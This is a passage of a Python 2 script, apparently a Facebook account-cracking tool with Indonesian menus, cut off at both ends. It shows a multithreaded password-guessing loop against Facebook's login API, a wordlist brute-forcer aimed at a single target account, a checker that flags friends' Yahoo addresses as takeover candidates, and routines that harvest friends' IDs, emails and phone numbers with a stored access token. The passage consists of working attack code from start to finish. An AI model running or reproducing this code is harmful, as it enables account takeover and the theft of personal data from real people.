                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass3
                                        else:
                                            if 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass3
                                            else:
                                                    lahir = b['birthday']
                                                    pass4 = lahir.replace('/', '')
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass4
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass4
                                                        else:
                                                            pass5 = ('sayang')
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass5
                                                            else:
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass5
								else:
								    pass6 = ('sayangku')
               							    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
               							    q = json.load(data)
               							    if 'access_token' in q:
           							        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass6
               							    else:
                   						        if 'www.facebook.com' in q['error_msg']:
                       							    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass6

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[0m[\x1b[94m#\x1b[0m] \x1b[77;1mFinish'
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        try:
            email = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID/Email/Hp Target :\x1b[0m ')
            passw = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mWordlist \x1b[0mext(list.txt) \x1b[77;1m: \x1b[0m')
            total = open(passw, 'r')
            total = total.readlines()
            print ''
            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mTarget :\x1b[77;1m ' + email
            print '\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mTotal\x1b[77;1m ' + str(len(total)) + ' \x1b[77;1mPassword'
            jalan('\x1b[0m[\x1b[95;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[0m[\x1b[93;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mTry \x1b[0m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                        print ''
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[77;1mUsername :\x1b[0m ' + email
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[77;1mPassword :\x1b[0m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                            print ''
                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                            print '\x1b[0m[\xe2\x9e\xb9] \x1b[77;1mUsername :\x1b[0m ' + email
                            print '\x1b[0m[\xe2\x9e\xb9] \x1b[77;1mPassword :\x1b[0m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mConnection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found...'
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mIf you in the wordlist is not found'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mAre you sure want to make wordlist ? \x1b[0m[y/t]\x1b[77;1m:\x1b[0m ')
    if why == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPlease choice \x1b[0m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 't':
                    menu_hack()
                else:
                    if why == 'T':
                        menu_hack()
                    else:
                        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPlease choice \x1b[0m(y/t)'
                        tanyaw()


def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('clear')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mFrom Friends'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mFrom File'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if go == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu_hack()
                else:
                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96] \x1b[0m' + go + ' \x1b[77;1mNot found'
                    yahoo_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    mpsh = []
    jml = 0
    jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print ''
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x96\x1b[0m] \x1b[0mEmail \x1b[77;1m:\x1b[77;1m ' + mail + ' \x1b[0m[\x1b[77;1m' + vulnot + '\x1b[0m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print ''
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName \x1b[0m:\x1b[77;1m ' + nama
                    print '\x1b[0m[\x1b[93;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + id
                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ' + mail + ' [\x1b[77;1m' + vuln + '\x1b[0m]'
                    print ''
                else:
                    print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ' + mail + ' \x1b[0m[\x1b[77;1m' + vulnot + '\x1b[0m]'
        except KeyError:
            pass

    print '\n\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mFinish'
    print '\x1b[0m[\x1b[95m+\x1b[0m] \x1b[77;1mSaved \x1b[77;1m:\x1b[0m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print logo
        print ''
        files = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile \x1b[77;1m: \x1b[0m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
    save = open('MailVuln.txt', 'w')
    print ''
    print '\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mStatus \x1b[77;1m:  \x1b[0mRed[\x1b[77;1m' + vulnot + '\x1b[0m]  Green[\x1b[77;1m' + vuln + '\x1b[0m]'
    print ''
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[0m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[0m ' + mail
            else:
                print '\x1b[0m ' + mail

    print '\n\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mFinish'
    print '\x1b[0m[\x1b[94m+\x1b[0m] \x1b[77;1mSaved \x1b[77;1m:\x1b[0m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    menu_yahoo()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mGet ID From Friends'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mGet Friends ID From Friends'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mGet ID From Group'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mGet Friends Email'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mGet Friends Email From Friends'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mGet Phone From Friends'
    print '\x1b[0m[\x1b[96;1m7\x1b[0m] \x1b[77;1mGet Friend\'s Phone From Friends'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    grab_pilih()


def grab_pilih():
    cuih = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if cuih == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        grab_pilih()
    else:
        if cuih == '1':
            id_friends()
        else:
            if cuih == '2':
                idfrom_friends()
            else:
                if cuih == '3':
                    id_member_grup()
                else:
                    if cuih == '4':
                        email()
                    else:
                        if cuih == '5':
                            emailfrom_friends()
                        else:
                            if cuih == '6':
                                nomor_hp()
                            else:
                                if cuih == '7':
                                    hpfrom_friends()
                                else:
                                    if cuih == '0':
                                        menu_hack()
                                    else:
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + cuih + ' \x1b[77;1mNot found'
                                        grab_pilih()


def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[77;1m: \x1b[0m')
            bz = open(save_id, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[0mName\x1b[77;1m  :\x1b[77;1m ' + ah['name']
                print '\x1b[0mID   \x1b[77;1m : \x1b[77;1m' + ah['id']
                print ''

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mTotal ID \x1b[77;1m %s' % len(idfriends)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + save_id
            bz.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAn error occurred'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mInput ID Friends \x1b[77;1m: \x1b[77;1m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mFrom\x1b[77;1m :\x1b[77;1m ' + op['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNot be friends'
                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                grab()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            bz = open(save_idt, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[0mName\x1b[0m  :\x1b[77;1m ' + ah['name']
                print '\x1b[0mID   \x1b[0m : \x1b[77;1m' + ah['id']
                print ''

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mTotal ID \x1b[77;1m %s' % len(idfromfriends)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + save_idt
            bz.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID grup \x1b[0m:\x1b[77;1m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mGroup name \x1b[0m:\x1b[77;1m ' + asw['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup not found'
                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                grab()

            simg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            b = open(simg, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[0mName\x1b[0m  :\x1b[77;1m ' + i['name']
                print '\x1b[0mID  \x1b[0m  :\x1b[77;1m ' + i['id']
                print ''

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mTotal ID \x1b[77;1m %s' % len(idmem)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + simg
            b.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('clear')
            print ''
            print logo
            print ''
            mails = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[0mName\x1b[0m  :\x1b[77;1m ' + z['name']
                    print '\x1b[0mEmail\x1b[0m : \x1b[77;1m' + z['email']
                    print ''
                except KeyError:
                    pass

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mTotal Email\x1b[77;1m %s' % len(em)
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + mails
            mpsh.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAn error occurred'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mInput ID Friends \x1b[0m: \x1b[77;1m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mFrom\x1b[0m :\x1b[77;1m ' + op['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNot be friends'
                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                grab()

            mails = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[0mName\x1b[0m  :\x1b[77;1m ' + z['name']
                    print '\x1b[0mEmail\x1b[0m : \x1b[77;1m' + z['email']
                    print ''
                except KeyError:
                    pass

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mTotal Email\x1b[77;1m %s' % len(emfromfriends)
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + mails
            mpsh.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            noms = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[0mName\x1b[0m  :\x1b[77;1m ' + z['name']
                    print '\x1b[0mPhone\x1b[0m : \x1b[77;1m' + z['mobile_phone']
                    print ''
                except KeyError:
                    pass

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mTotal Phone\x1b[77;1m %s' % len(hp)
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + noms
            no.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAn error occurred '
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mInput Friends ID \x1b[0m: \x1b[77;1m')
            try:
